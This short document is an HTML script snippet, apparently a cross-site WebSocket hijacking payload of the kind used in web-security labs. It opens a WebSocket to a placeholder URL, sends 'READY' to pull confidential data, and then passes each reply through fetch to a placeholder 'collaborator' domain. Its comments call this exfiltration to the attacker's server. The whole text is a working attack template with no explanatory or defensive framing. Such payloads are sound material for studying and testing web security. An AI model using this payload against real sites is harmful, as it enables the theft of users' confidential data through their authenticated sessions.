<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY") //Send the message to retrieve confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script> 
